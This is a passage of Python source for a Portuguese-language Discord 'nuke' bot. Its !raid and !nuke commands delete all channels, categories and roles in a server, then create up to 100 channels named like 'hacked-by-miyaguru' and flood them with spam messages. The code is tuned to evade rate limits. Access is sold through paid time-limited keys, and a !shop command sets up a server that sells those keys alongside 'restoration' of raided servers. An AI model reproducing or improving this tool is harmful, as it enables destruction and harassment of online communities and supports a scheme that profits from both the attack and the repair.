        # Pequeno: tudo paralelo instantâneo
        tasks = [delete_channel_fast(ch) for ch in channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        deleted = sum(1 for r in results if r is True)
    else:
        # Médio/Grande: lotes com delay
        deleted = 0
        for i in range(0, total, batch_size):
            batch = channels[i:i+batch_size]
            if size_type == "large":
                tasks = [delete_channel_with_retry(ch) for ch in batch]
            else:
                tasks = [delete_channel_fast(ch) for ch in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            deleted += sum(1 for r in results if r is True)
            if i + batch_size < total:
                await asyncio.sleep(delay)
    
    failed = len(channels) - deleted
    print(f"      [RESULT] {deleted}/{len(channels)} apagados | {failed} falharam")
    return deleted


async def delete_all_categories(guild):
    """Apaga TODAS as categorias — adapta pro tamanho"""
    size_type, total, batch_size, delay = detect_server_size(guild)
    cats = list(guild.categories)
    print(f"      [SCAN] {len(cats)} categorias encontradas para apagar")
    
    if size_type == "small":
        tasks = [delete_channel_fast(cat) for cat in cats]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        deleted = sum(1 for r in results if r is True)
    else:
        deleted = 0
        for i in range(0, len(cats), batch_size):
            batch = cats[i:i+batch_size]
            tasks = [delete_channel_fast(cat) for cat in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            deleted += sum(1 for r in results if r is True)
            if i + batch_size < len(cats):
                await asyncio.sleep(delay)
    
    failed = len(cats) - deleted
    print(f"      [RESULT] {deleted}/{len(cats)} apagadas | {failed} falharam")
    return deleted


async def delete_all_roles(guild):
    """Apaga todas as roles — mostra quais apagou e quais não"""
    deleted = 0
    skipped = 0
    failed = 0
    deleted_names = []
    skipped_names = []
    
    for role in list(guild.roles):
        try:
            if role.is_default():
                continue
            if role.position >= guild.me.top_role.position:
                skipped += 1
                skipped_names.append(role.name)
                continue
            await role.delete()
            deleted += 1
            deleted_names.append(role.name)
        except Exception:
            failed += 1
            skipped_names.append(role.name)
    
    print(f"      [RESULT] {deleted} apagadas | {len(skipped_names)} acima do bot | {failed} falharam")
    if deleted_names:
        print(f"      ✅ Apagadas: {', '.join(deleted_names[:10])}{'...' if len(deleted_names) > 10 else ''}")
    if skipped_names:
        print(f"      ⚠️  Não apagadas (acima do bot): {', '.join(skipped_names[:10])}{'...' if len(skipped_names) > 10 else ''}")
    
    return deleted


async def create_channel_with_retry(guild, name, retries=3):
    """Cria um canal com retry pra rate limit"""
    for attempt in range(retries):
        try:
            channel = await guild.create_text_channel(name=name)
            return channel
        except Exception as e:
            error_msg = str(e).lower()
            if "rate" in error_msg or "429" in error_msg:
                await asyncio.sleep(0.5 * (attempt + 1))
                continue
            return None
    return None


async def create_all_channels(guild, count=50):
    """Cria canais — adapta pro tamanho do servidor"""
    size_type, _, batch_size, delay = detect_server_size(guild)
    
    if size_type == "small":
        # Pequeno: tudo paralelo instantâneo
        tasks = [
            create_channel_fast(guild, random.choice(CHANNEL_NAMES))
            for _ in range(count)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        channels = [r for r in results if r is not None and isinstance(r, discord.TextChannel)]
    else:
        # Médio/Grande: lotes com delay
        created = []
        for i in range(0, count, batch_size):
            batch_count = min(batch_size, count - i)
            if size_type == "large":
                tasks = [
                    create_channel_with_retry(guild, random.choice(CHANNEL_NAMES))
                    for _ in range(batch_count)
                ]
            else:
                tasks = [
                    create_channel_fast(guild, random.choice(CHANNEL_NAMES))
                    for _ in range(batch_count)
                ]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            created.extend(r for r in results if r is not None and isinstance(r, discord.TextChannel))
            if i + batch_size < count:
                await asyncio.sleep(delay)
        channels = created
    
    return channels


async def spam_channel_fast(channel, count=MSG_PER_CHANNEL):
    """Envia várias mensagens em 1 canal"""
    tasks = [
        send_message_fast(channel, random.choice(GLITCH_MESSAGES))
        for _ in range(count)
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    sent = sum(1 for r in results if r is True)
    return sent


async def spam_all_channels(channels):
    """Spam em TODOS os canais em paralelo"""
    tasks = [spam_channel_fast(ch) for ch in channels]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    total = sum(r for r in results if isinstance(r, int))
    return total


# ============================================================
# COMANDOS
# ============================================================

@bot.event
async def on_message(message):
    global RAID_ACTIVE

    if message.author.bot:
        return

    guild = message.guild
    if not guild:
        return

    content = message.content.strip()

    # ============================================================
    # SISTEMA DE AUTENTICAÇÃO
    # ============================================================

    # Owner tem acesso total — nunca precisa de key
    is_owner = (message.author.id == OWNER_ID)

    # Se a mensagem NÃO começa com !, ignora (não é um comando)
    if not content.startswith("!"):
        return

    if not is_owner:
        # Carrega as keys autorizadas
        keys_data = load_keys()

        # Verificar se o usuário já está autenticado com key válida
        user_authenticated = False
        for key_str, key_info in keys_data["keys"].items():
            if key_info.get("user_id") == message.author.id and is_key_valid(key_info):
                user_authenticated = True
                break

        # Permitir comandos públicos sempre (!use, !help, !info)
        is_public_cmd = (content.startswith("!use ") or content == "!help" or content == "!info")

        if not user_authenticated and not is_public_cmd:
            try:
                await message.channel.send(
                    f"🔒 **Acesso negado!**\n"
                    f"Você precisa de uma key para usar este bot.\n"
                    f"Use `!use <sua_key>` para ativar ou peça uma key ao dono."
                )
            except Exception:
                pass
            return

    # ============================================================
    # COMANDOS DE KEY
    # ============================================================

    # ---- !use <key> (Qualquer um pode usar) ----
    if content.startswith("!use "):
        key_str = content[5:].strip()
        keys_data = load_keys()
        if key_str not in keys_data["keys"]:
            try:
                await message.channel.send("❌ Key inválida!")
            except Exception:
                pass
            return

        key_info = keys_data["keys"][key_str]
        if not is_key_valid(key_info):
            try:
                await message.channel.send("❌ Essa key já expirou!")
            except Exception:
                pass
            return
        if key_info.get("revoked"):
            try:
                await message.channel.send("❌ Essa key foi revogada pelo dono!")
            except Exception:
                pass
            return

        # Vincular key ao usuário
        key_info["user_id"] = int(message.author.id)
        key_info["user_name"] = str(message.author)
        key_info["activated_at"] = time.time()
        save_keys(keys_data)

        try:
            await message.channel.send(
                f"✅ **Key ativada com sucesso!**\n"
                f"🔑 Key: `{key_str}`\n"
                f"👤 Usuário: {message.author.mention}\n"
                f"⏱️ Expira em: {format_remaining(key_info.get('expires') - time.time() if key_info.get('expires') else None)}\n"
                f"\nAgora você pode usar todos os comandos do bot!"
            )
        except Exception:
            pass
        return

    # ---- !key gen <duração> (SÓ OWNER) ----
    if content.startswith("!key gen ") and is_owner:
        duration_str = content[9:].strip()
        duration_secs = parse_duration(duration_str)
        if duration_secs is None and duration_str.lower() != "lifetime":
            try:
                await message.channel.send(
                    "❌ **Duração inválida!**\n\n"
                    "Use: `30m`, `1h`, `30d`, `1y`, `2y`, `lifetime`\n"
                    "Exemplo: `!key gen 1h`"
                )
            except Exception:
                pass
            return

        key_str = generate_key()
        now = time.time()
        expires = now + duration_secs if duration_secs else None

        keys_data = load_keys()
        keys_data["keys"][key_str] = {
            "created_at": now,
            "created_by": OWNER_ID,
            "duration": duration_str,
            "expires": expires,
            "user_id": None,
            "user_name": None,
            "activated_at": None,
            "revoked": False,
        }
        save_keys(keys_data)

        remaining = format_remaining(expires - now if expires else None)
        try:
            await message.channel.send(
                f"🔑 **Key gerada com sucesso!**\n\n"
                f"```{key_str}```\n"
                f"⏱️ Duração: `{duration_str}`\n"
                f"⏳ Expira em: {remaining}\n"
                f"\nEnvie essa key para alguém e peça pra usar `!use {key_str}`"
            )
        except Exception:
            pass
        return

    # ---- !keys (Painel — SÓ OWNER) ----
    if content == "!keys" and is_owner:
        keys_data = load_keys()
        keys = keys_data["keys"]
        if not keys:
            try:
                await message.channel.send("📋 **Nenhuma key gerada ainda.**\nUse `!key gen <duração>` para criar.")
            except Exception:
                pass
            return

        total_keys = len(keys)
        active_keys = sum(1 for k in keys.values() if is_key_valid(k) and not k.get("revoked"))
        used_keys = sum(1 for k in keys.values() if k.get("activated_at") and is_key_valid(k))
        expired_keys = sum(1 for k in keys.values() if not is_key_valid(k))
        revoked_keys = sum(1 for k in keys.values() if k.get("revoked"))

        embed_desc = (
            f"**📊 Estatísticas:**\n"
            f"🔑 Total geradas: `{total_keys}`\n"
            f"✅ Ativas: `{active_keys}`\n"
            f"👥 Em uso: `{used_keys}`\n"
            f"❌ Expiradas: `{expired_keys}`\n"
            f"🚫 Revogadas: `{revoked_keys}`\n\n"
        )

        for key_str, key_info in keys.items():
            status_icon = "🟢" if (is_key_valid(key_info) and not key_info.get("revoked")) else "🔴"
            if key_info.get("revoked"):
                status_icon = "🚫"

            user_display = key_info.get("user_name", "Ninguém")
            expires_display = format_remaining(
                key_info.get("expires") - time.time() if key_info.get("expires") else None
            )
            duration_display = key_info.get("duration", "?")

            embed_desc += (
                f"**{status_icon} `{key_str}`**\n"
                f"   ⏱️ Duração: `{duration_display}`\n"
                f"   👤 Usada por: {user_display}\n"
                f"   ⏳ Status: {expires_display}\n\n"
            )

        try:
            await message.channel.send(embed_desc)
        except Exception:
            pass
        return

    # ---- !key revoke <key> (SÓ OWNER) ----
    if content.startswith("!key revoke ") and is_owner:
        key_str = content[12:].strip()
        keys_data = load_keys()
        if key_str not in keys_data["keys"]:
            try:
                await message.channel.send("❌ Key não encontrada!")
            except Exception:
                pass
            return

        keys_data["keys"][key_str]["revoked"] = True
        keys_data["keys"][key_str]["user_id"] = None
        keys_data["keys"][key_str]["user_name"] = None
        save_keys(keys_data)

        try:
            await message.channel.send(f"🚫 Key `{key_str}` revogada com sucesso!")
        except Exception:
            pass
        return

    # ============================================================
    # COMANDOS DO BOT (requer autenticação)
    # ============================================================

    # ---- !raid ----
    if content == "!raid":
        if RAID_ACTIVE:
            try:
                await message.reply("⚠️ Raid já está ativo!")
            except Exception:
                pass
            return

        RAID_ACTIVE = True

        # Backup automático COM PERMISSÕES
        print("[RAID] Backup automático (com permissões)...")
        await save_backup(guild)

        try:
            await message.channel.send("🚨 RAID INICIADO!")
        except Exception:
            pass

        print("\n[RAID] INICIANDO RAID COMPLETO...")

        # Escaneia o servidor
        total_channels = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
        total_cats = len(guild.categories)
        size_type, _, _, _ = detect_server_size(guild)
        print(f"[SCAN] {total_channels} canais | {total_cats} categorias | Método: {size_type}")

        # Fase 1: Apagar canais (adaptativo) + categorias (adaptativo)
        print("[1/3] Apagando canais...")
        deleted_ch = await delete_all_channels(guild)

        print("[1b/3] Apagando categorias...")
        deleted_cat = await delete_all_categories(guild)

        # Esperar os deletes terminarem antes de criar
        print("       Aguardando Discord processar deleções...")
        await asyncio.sleep(3)

        # Fase 2: Criar 50 canais (adaptativo)
        print("[2/3] Criando 50 canais (adaptativo)...")
        new_channels = await create_all_channels(guild, count=50)
        created = len(new_channels)
        print(f"      {created} canais criados")

        # Fase 3: Spam 15 msgs por canal
        print("[3/3] Enviando 15 msgs por canal...")
        sent = await spam_all_channels(new_channels)
        print(f"      {sent} mensagens enviadas")

        print(f"\n[RAID] RAID CONCLUÍDO!")
        print(f"       Canais apagados: {deleted_ch}/{total_channels}")
        print(f"       Categorias apagadas: {deleted_cat}/{total_cats}")
        print(f"       Canais criados: {created}")
        print(f"       Mensagens: {sent}")

        try:
            await message.channel.send(
                f"✅ RAID CONCLUÍDO!\n"
                f"📡 {deleted_ch}/{total_channels} canais apagados\n"
                f"🗂️ {deleted_cat}/{total_cats} categorias apagadas\n"
                f"📂 {created} novos canais\n"
                f"💬 {sent} mensagens enviadas\n"
                f"💾 Backup salvo (com permissões)"
            )
        except Exception:
            pass

        RAID_ACTIVE = False

    # ---- !raid stop ----
    elif content == "!raid stop":
        RAID_ACTIVE = False
        print("[RAID] Raid parado!")
        try:
            await message.channel.send("🛑 Raid parado!")
        except Exception:
            pass

    # ---- !nuke (Cria 100 canais + spam) ----
    elif content == "!nuke":
        if RAID_ACTIVE:
            try:
                await message.reply("⚠️ Já tem um raid/nuke ativo!")
            except Exception:
                pass
            return

        RAID_ACTIVE = True

        # Backup automático COM PERMISSÕES
        print("[NUKE] Backup automático (com permissões)...")
        await save_backup(guild)

        try:
            await message.channel.send("💣 NUKE INICIADO!")
        except Exception:
            pass

        print("\n[NUKE] INICIANDO NUKE COMPLETO...")

        # Escaneia o servidor
        total_channels = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
        total_cats = len(guild.categories)
        size_type, _, _, _ = detect_server_size(guild)
        print(f"[SCAN] {total_channels} canais | {total_cats} categorias | Método: {size_type}")

        # Fase 1: Apagar canais (adaptativo) + categorias (adaptativo)
        print("[1/3] Apagando canais...")
        deleted_ch = await delete_all_channels(guild)

        print("[1b/3] Apagando categorias...")
        deleted_cat = await delete_all_categories(guild)

        # Esperar os deletes terminarem antes de criar
        print("       Aguardando Discord processar deleções...")
        await asyncio.sleep(3)

        # Fase 2: Criar 100 canais (adaptativo)
        print("[2/3] Criando 100 canais (adaptativo)...")
        new_channels = await create_all_channels(guild, count=100)
        created = len(new_channels)
        print(f"      {created} canais criados")

        # Fase 3: Spam 15 msgs por canal
        print("[3/3] Enviando 15 msgs por canal...")
        sent = await spam_all_channels(new_channels)
        print(f"      {sent} mensagens enviadas")

        print(f"\n[NUKE] NUKE CONCLUÍDO!")
        print(f"       Canais apagados: {deleted_ch}/{total_channels}")
        print(f"       Categorias apagadas: {deleted_cat}/{total_cats}")
        print(f"       Canais criados: {created}")
        print(f"       Mensagens: {sent}")

        try:
            await message.channel.send(
                f"💣 NUKE CONCLUÍDO!\n"
                f"📡 {deleted_ch}/{total_channels} canais apagados\n"
                f"🗂️ {deleted_cat}/{total_cats} categorias apagadas\n"
                f"📂 {created} novos canais (100)\n"
                f"💬 {sent} mensagens enviadas\n"
                f"💾 Backup salvo (com permissões)"
            )
        except Exception:
            pass

        RAID_ACTIVE = False

    # ---- !backup ----
    elif content == "!backup":
        try:
            await message.channel.send("💾 Salvando backup com permissões...")
        except Exception:
            pass

        print("\n[BACKUP] Iniciando...")
        backup = await save_backup(guild)

        try:
            await message.channel.send(
                f"💾 **Backup salvo com permissões!**\n"
                f"📁 Categorias: {len(backup['categories'])}\n"
                f"📋 Roles: {len(backup['roles'])}\n"
                f"📂 Canais: {len(backup['channels'])}\n"
                f"🔒 Permissões salvas em todos os itens"
            )
        except Exception:
            pass

        print("[BACKUP] CONCLUÍDO!")

    # ---- !restore ----
    elif content == "!restore":
        if not is_owner:
            try:
                await message.channel.send("🔒 **Apenas o dono pode usar este comando!**")
            except Exception:
                pass
            return

        print(f"\n[RESTORE] Iniciando restauração SMART no servidor: {guild.name}")

        raid_channel_names = ["hacked", "hacked-by-miyaguru", "r-a-i-d", "dominado-por-miyaguru"]

        def is_raid_backup(data):
            """Verifica se o backup/config é de um servidor raidado/nukeado"""
            if not data:
                return False
            channels = data.get("channels", [])
            if not channels:
                return False
            first_name = channels[0].get("name", "")
            # Se o primeiro canal é um nome de raid, é backup raidado
            if first_name in raid_channel_names:
                return True
            # Se tem mais de 30 canais e o primeiro é genérico (canal-0, canal-1...), provavelmente é raid
            if len(channels) > 30:
                first_two = channels[0].get("name", "")
                if first_two.startswith("canal-") or first_two.startswith("spam-"):
                    return True
            return False

        # FASE 1: Verificar se tem backup local
        has_local_backup = os.path.exists(BACKUP_FILE)
        # FASE 2: Verificar se tem config persistente
        configs = load_server_configs()
        has_config = str(guild.id) in configs.get("servers", {})
        
        # Verificar se o backup é raidado
        backup_is_raid = False
        if has_local_backup:
            try:
                with open(BACKUP_FILE, "r", encoding="utf-8") as f:
                    backup_data = json.load(f)
                backup_is_raid = is_raid_backup(backup_data)
            except Exception:
                pass
        elif has_config:
            config_data = configs["servers"].get(str(guild.id))
            backup_is_raid = is_raid_backup(config_data)

        if backup_is_raid:
            # Backup é de servidor raidado — ignorar e criar servidor limpo
            print("[RESTORE] ⚠️ Backup detectado como RAIDADO — usando servidor limpo!")
            try:
                await message.channel.send(
                    "♻️ **Modo SMART — Backup parece ser de servidor raidado!**\n"
                    "🔨 Ignorando backup raidado — criando servidor limpo..."
                )
            except Exception:
                pass
            print("[RESTORE] Criando servidor limpo...")
            success, msg = await smart_clean_restore(guild)

        elif has_local_backup:
            # Método 1: Backup local (mais completo)
            try:
                await message.channel.send("♻️ **Modo SMART — Restaurando do backup local...**")
            except Exception:
                pass
            print("[RESTORE] Usando backup local...")
            success, msg = await restore_backup(guild)

        elif has_config:
            # Método 2: Config persistente (funciona mesmo sem backup local)
            try:
                await message.channel.send("♻️ **Modo SMART — Restaurando do config persistente...**")
            except Exception:
                pass
            print("[RESTORE] Usando config persistente...")
            success, msg = await restore_from_config(guild)

        else:
            # Método 3: SEM BACKUP — Cria servidor limpo padrão
            try:
                await message.channel.send(
                    "♻️ **Modo SMART — Nenhum backup encontrado!**\n"
                    "🔨 Criando servidor limpo com canais padrão..."
                )
            except Exception:
                pass
            print("[RESTORE] Nenhum backup encontrado! Criando servidor limpo...")
            success, msg = await smart_clean_restore(guild)

        try:
            await message.channel.send(msg if success else f"❌ {msg}")
        except Exception:
            pass

    # !audit-restore foi removido (Discord não guarda nomes no Audit Log)
    # Use !restore (backup automático) ou !saveconfig

    # ---- !saveconfig (SÓ OWNER) — Atualiza config manualmente ----
    elif content == "!saveconfig":
        try:
            await message.channel.send("💾 Atualizando configs do servidor...")
        except Exception:
            pass
        print("\n[CONFIG] Atualizando config persistente...")
        config = await save_server_config(guild)
        try:
            await message.channel.send(
                f"✅ **Config atualizada!**\n"
                f"🏷️ Servidor: **{guild.name}**\n"
                f"👑 Dono: {guild.owner} (`{guild.owner_id}`)\n"
                f"🆔 ID: `{guild.id}`\n"
                f"👥 Membros: {guild.member_count}\n"
                f"📁 Categorias: {len(config['categories'])}\n"
                f"📋 Roles: {len(config['roles'])}\n"
                f"📂 Canais: {len(config['channels'])}\n"
                f"\nConfig salva automaticamente mesmo se o bot for banido!"
            )
        except Exception:
            pass
        print("[CONFIG] CONCLUÍDO!")

    # ---- !configs (Painel de servidores salvos — SÓ OWNER) ----
    elif content == "!configs":
        configs = load_server_configs()
        servers = configs.get("servers", {})
        if not servers:
            try:
                await message.channel.send("📋 **Nenhum servidor salvo.**")
            except Exception:
                pass
            return
        desc = "**🖥️ Servidores salvos (auto):**\n\n"
        for srv_id, srv_config in servers.items():
            owner_name = srv_config.get("owner_name", "?")
            owner_id = srv_config.get("owner_id", "?")
            desc += (
                f"**{srv_config.get('guild_name', '?')}** (`{srv_id}`)\n"
                f"   👑 Dono: {owner_name} (`{owner_id}`)\n"
                f"   👥 Membros: {srv_config.get('member_count', '?')}\n"
                f"   📁 {len(srv_config.get('categories', []))} categorias | "
                f"📋 {len(srv_config.get('roles', []))} roles | "
                f"📂 {len(srv_config.get('channels', []))} canais\n"
                f"   📅 Salvo em: {srv_config.get('saved_at', '?')}\n\n"
            )
        try:
            await message.channel.send(desc)
        except Exception:
            pass

    # ---- !shop (SÓ OWNER) — Cria servidor de vendas completo ----
    elif content.startswith("!shop"):
        if not is_owner:
            return

        sub_cmd = content[5:].strip() if len(content) > 5 else ""

        if sub_cmd == "setup":
            # === LIMPAR SERVIDOR ANTES DE CRIAR ===
            try:
                await message.channel.send("🏪 Limpando servidor antes de configurar...")
            except Exception:
                pass

            print("\n[SHOP] Apagando canais existentes...")
            channels = list(guild.text_channels)
            categories = list(guild.categories)

            await asyncio.gather(*[c.delete() for c in channels], return_exceptions=True)
            await asyncio.sleep(2)
            await asyncio.gather(*[c.delete() for c in categories], return_exceptions=True)
            print(f"[SHOP] {len(channels)} canais e {len(categories)} categorias apagados")

            try:
                await message.channel.send("🏪 Limpando servidor de vendas...")
            except Exception:
                pass

            print("\n[SHOP] Criando servidor de vendas...")

            # === CARGOS ===
            print("[SHOP] Criando cargos...")
            everyone = guild.default_role
            role_staff = await guild.create_role(name="Staff", color=discord.Color.gold(), hoist=True, mentionable=False)
            role_vendedor = await guild.create_role(name="Vendedor", color=discord.Color.blue(), hoist=True, mentionable=False)
            role_cliente = await guild.create_role(name="Cliente", color=discord.Color.green(), hoist=True, mentionable=False)
            role_ticket_staff = await guild.create_role(name="Ticket Staff", color=discord.Color.purple(), hoist=True, mentionable=False)
            print(f"       4 cargos criados: Staff, Vendedor, Cliente, Ticket Staff")

            # === CATEGORIAS ===
            print("[SHOP] Criando categorias...")

            # 1. INFORMAÇÕES — Todos podem ver, ninguém pode mandar msg (só staff)
            cat_info = await guild.create_category("ℹ️︳INFORMAÇÕES")
            await cat_info.set_permissions(everyone, read_messages=True, send_messages=False, add_reactions=True)
            await cat_info.set_permissions(role_staff, send_messages=True)

            # 2. TICKET — Todos podem ver, mas só podem clicar no botão (não mandar msg)
            cat_tickets = await guild.create_category("🎫︳TICKETS")
            await cat_tickets.set_permissions(everyone, read_messages=True, send_messages=False, add_reactions=True)
            await cat_tickets.set_permissions(role_staff, send_messages=True, manage_channels=True)
            await cat_tickets.set_permissions(role_ticket_staff, send_messages=True, manage_channels=True)

            # 3. VENDAS — Todos podem ver, mas não mandar (só staff e vendedor)
            cat_vendas = await guild.create_category("💰︳VENDAS")
            await cat_vendas.set_permissions(everyone, read_messages=True, send_messages=False, add_reactions=True)
            await cat_vendas.set_permissions(role_staff, send_messages=True)
            await cat_vendas.set_permissions(role_vendedor, send_messages=True)

            # 4. CLIENTES — PRIVADO (só quem tem cargo Cliente pode ver)
            cat_clientes = await guild.create_category("👥︳CLIENTES")
            await cat_clientes.set_permissions(everyone, read_messages=False, send_messages=False)
            await cat_clientes.set_permissions(role_cliente, read_messages=True, send_messages=True)
            await cat_clientes.set_permissions(role_staff, read_messages=True, send_messages=True)
            await cat_clientes.set_permissions(role_vendedor, read_messages=True, send_messages=True)

            # 5. COMUNIDADE — Categoria com canais específicos
            cat_comunidade = await guild.create_category("💬︳COMUNIDADE")
            await cat_comunidade.set_permissions(everyone, read_messages=True, send_messages=True, add_reactions=True)
            await cat_comunidade.set_permissions(role_staff, send_messages=True)

            # 6. STAFF — Privado (só staff)
            cat_staff = await guild.create_category("🔒︳STAFF")
            await cat_staff.set_permissions(everyone, read_messages=False, send_messages=False)
            await cat_staff.set_permissions(role_staff, read_messages=True, send_messages=True, manage_channels=True)
            await cat_staff.set_permissions(role_vendedor, read_messages=True, send_messages=True)
            await cat_staff.set_permissions(role_ticket_staff, read_messages=True, send_messages=True, manage_channels=True)

            # === CANAIS ===
            print("[SHOP] Criando canais...")

            # Canais de INFORMAÇÕES
            bem_vindo_ch = await guild.create_text_channel("👋︳bem-vindo", category=cat_info)
            regras_ch = await guild.create_text_channel("📜︳regras", category=cat_info)
            anuncios_ch = await guild.create_text_channel("📢︳anúncios", category=cat_info)
            await guild.create_text_channel("⭐︳feedback", category=cat_info)
            await guild.create_text_channel("🤝︳parceria", category=cat_info)
            await guild.create_text_channel("⚠️︳avisos", category=cat_info)

            # Canais de TICKET
            ticket_channel = await guild.create_text_channel("🎫︳abrir-ticket", category=cat_tickets)
            faq_ch = await guild.create_text_channel("❓︳faq", category=cat_tickets)

            # Canais de VENDAS
            catalogo_ch = await guild.create_text_channel("📦︳catalogo", category=cat_vendas)
            comprovantes_ch = await guild.create_text_channel("🧾︳comprovantes", category=cat_vendas)
            await guild.create_text_channel("🔄︳pós-venda", category=cat_vendas)
            await guild.create_text_channel("⭐︳avaliações", category=cat_vendas)
            await guild.create_text_channel("🏷️︳promoções", category=cat_vendas)

            # Canais de CLIENTES (privado)
            await guild.create_text_channel("💬︳chat-clientes", category=cat_clientes)
            await guild.create_text_channel("❓︳dúvidas-compra", category=cat_clientes)
            await guild.create_text_channel("🛟︳suporte-clientes", category=cat_clientes)

            # Canais de COMUNIDADE — Criar todos primeiro, depois aplicar permissões
            chat_geral = await guild.create_text_channel("💬︳chat-geral", category=cat_comunidade)
            midias = await guild.create_text_channel("📸︳midias", category=cat_comunidade)
            comandos = await guild.create_text_channel("⌨️︳comandos", category=cat_comunidade)

            # Canais de VOZ
            await guild.create_voice_channel("🔊︳Voz 1", category=cat_comunidade)
            await guild.create_voice_channel("🔊︳Voz 2", category=cat_comunidade)
            await guild.create_voice_channel("🔊︳Voz 3", category=cat_comunidade)

            # Canais de STAFF
            await guild.create_text_channel("💬︳chat-staff", category=cat_staff)
            await guild.create_text_channel("📋︳logs", category=cat_staff)
            await guild.create_text_channel("📌︳reunião", category=cat_staff)
            await guild.create_text_channel("📢︳anúncios-staff", category=cat_staff)

            print(f"       ~30 canais criados em 7 categorias")

            # === APLICAR PERMISSÕES ESPECIAIS (DEPOIS DE CRIAR TODOS) ===
            try:
                # chat-geral: NÃO pode enviar mídia, NÃO pode usar comandos
                chat_geral.overwrite_permissions(everyone, attach_files=False, use_external_emojis=False)
                chat_geral.overwrite_permissions(role_staff, attach_files=True, use_external_emojis=True)

                # midias: pode enviar mídia, pode usar emojis externos
                midias.overwrite_permissions(everyone, attach_files=True, use_external_emojis=True)
                midias.overwrite_permissions(role_staff, attach_files=True)

                # comandos: NÃO pode enviar mídia
                comandos.overwrite_permissions(everyone, attach_files=False, use_external_emojis=False)
                comandos.overwrite_permissions(role_staff, attach_files=True)

                print("[SHOP] Permissões especiais aplicadas nos canais de COMUNIDADE")
            except Exception as e:
                print(f"[SHOP] Erro ao aplicar permissões: {e}")

            # === PAINEL DO TICKET ===
            print("[SHOP] Criando painel de tickets...")
            ticket_embed = discord.Embed(
                title="🎫 Abrir Ticket",
                description=(
                    "**Bem-vindo ao suporte!**\n\n"
                    "Para abrir um ticket, clique no botão abaixo 👇\n\n"
                    "📋 **Como funciona:**\n"
                    "1. Clique em **Abrir Ticket**\n"
                    "2. Um canal privado será criado pra você\n"
                    "3. A staff vai te atender lá\n\n"
                    "⚠️ **Regras:**\n"
                    "• Seja educado com a staff\n"
                    "• Explique seu problema com detalhes\n"
                    "• Tickets falsos serão fechados"
                ),
                color=discord.Color.purple()
            )
            ticket_embed.set_footer(text="Miyaguru Shop — Suporte 24/7")

            try:
                view = TicketView()
                await ticket_channel.send(embed=ticket_embed, view=view)
            except Exception:
                await ticket_channel.send(
                    "🎫 **Para abrir um ticket, digite:** `!ticket abrir`\n"
                    "Um canal privado será criado pra você!"
                )

            # === ENVIAR TEXTOS NOS CANAIS (usando referências diretas) ===
            await asyncio.sleep(3)

            try:
                # Bem-vindo
                welcome_embed = discord.Embed(
                    title="👋 Bem-vindo ao Miyaguru Shop!",
                    description=(
                        f"Seja muito bem-vindo ao nosso servidor! Aqui você encontra keys do bot e restauração de servidores raidados.\n\n"
                        f"**📋 Primeiros passos:**\n"
                        f"1. Leia as regras em <#{regras_ch.id}> 📜\n"
                        f"2. Confira nosso catálogo em <#{catalogo_ch.id}> 📦\n"
                        f"3. Abra um ticket em <#{ticket_channel.id}> 🎫 pra comprar\n\n"
                        f"**🛡️ Nossos Serviços:**\n"
                        f"• Keys do bot Miyaguru — **R$1 a R$80**\n"
                        f"  └ De 30 minutos até Lifetime\n\n"
                        f"• Restaurador de servidor — **R$2**\n"
                        f"  └ Restaura canais, categorias e permissões em segundos\n\n"
                        f"**💬 Como funciona?**\n"
                        f"1. Abra um ticket no canal de tickets\n"
                        f"2. Escolha o que precisa\n"
                        f"3. Faça o pagamento (PIX)\n"
                        f"4. Pronto! Tudo feito rapidinho\n\n"
                        f"**⚡ Por que escolher a gente?**\n"
                        f"• Atendimento rápido e eficiente\n"
                        f"• Preços acessíveis\n"
                        f"• Resultados garantidos\n\n"
                        f"Qualquer dúvida, abra um ticket! 🎫"
                    ),
                    color=discord.Color.blue()
                )
                welcome_embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
                welcome_embed.set_footer(text="Miyaguru Shop — Desde 2024")
                await bem_vindo_ch.send(embed=welcome_embed)
                print("[SHOP] Mensagem enviada em bem-vindo")
            except Exception as e:
                print(f"[SHOP] Erro ao enviar em bem-vindo: {e}")

            try:
                # Regras
                regras_embed = discord.Embed(
                    title="📜 Regras do Servidor",
                    description=(
                        "**🔴 Regras Gerais:**\n"
                        "1. Respeite todos os membros e a staff\n"
                        "2. Não faça spam ou flood nos canais\n"
                        "3. Não envie conteúdo NSFW sem permissão\n"
                        "4. Não divulgue outros servidores sem autorização\n"
                        "5. Não peça reembolso após o serviço ser concluído\n\n"
                        "**💰 Sobre as Vendas:**\n"
                        "1. Abra um ticket pra fazer sua compra\n"
                        "2. O pagamento é feito via PIX\n"
                        "3. O serviço só começa após confirmação do pagamento\n"
                        "4. Não garantimos resultado se o bot for banido durante o processo\n"
                        "5. Preços são fixos, não negociamos\n\n"
                        "**🎫 Sobre Tickets:**\n"
                        "1. Abra apenas 1 ticket por vez\n"
                        "2. Seja claro sobre o que precisa\n"
                        "3. Não feche o ticket antes do serviço ser concluído\n"
                        "4. Tickets falsos serão fechados imediatamente\n\n"
                        "**⚠️ Penalidades:**\n"
                        "• 1ª infração: Aviso\n"
                        "• 2ª infração: Mute temporário\n"
                        "• 3ª infração: Banimento permanente\n\n"
                        "Ao permanecer no servidor, você concorda com todas as regras."
                    ),
                    color=discord.Color.red()
                )
                regras_embed.set_footer(text="Miyaguru Shop — Regras inegociáveis")
                await regras_ch.send(embed=regras_embed)
                print("[SHOP] Mensagem enviada em regras")
            except Exception as e:
                print(f"[SHOP] Erro ao enviar em regras: {e}")

            try:
                # FAQ
                faq_embed = discord.Embed(
                    title="❓ Perguntas Frequentes (FAQ)",
                    description=(
                        f"**P: Como faço para comprar?**\n"
                        f"R: Abra um ticket no canal de tickets e informe o que precisa!\n\n"
                        f"**P: Quais formas de pagamento?**\n"
                        f"R: Apenas PIX. O QR Code será enviado no ticket.\n\n"
                        f"**P: Quanto tempo demora o serviço?**\n"
                        f"R: Geralmente menos de 5 minutos após o pagamento!\n\n"
                        f"**P: E se o bot for banido durante a recuperação?**\n"
